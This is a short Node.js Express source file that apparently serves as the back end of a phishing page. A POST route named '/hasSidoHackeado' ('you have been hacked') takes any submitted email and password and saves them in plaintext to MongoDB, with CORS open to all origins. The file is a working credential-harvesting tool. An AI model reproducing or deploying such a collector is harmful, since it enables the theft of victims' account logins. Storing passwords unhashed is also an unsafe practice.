const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
require("dotenv").config();

const app = express();
app.use(cors());
app.use(bodyParser.json());

mongoose.connect(process.env.MONGO_uri,{
    useNewUrlParser: true,
    useUnifiedTopology: true
});

const datos =  new  mongoose.Schema({
    email: String,
    password: String
})

const usuario =  mongoose.model('usuario', datos);

app.post("/hasSidoHackeado", async ( req , res ) => {
    const { email , password } = req.body;
    const usuarioBD = new usuario({ email , password });
    await usuarioBD.save();
    res.status(201).send("Informacion  guardada");
});

app.listen(3000,  () => {
    console.log("Servidor escuchando en el puerto 3000");
})
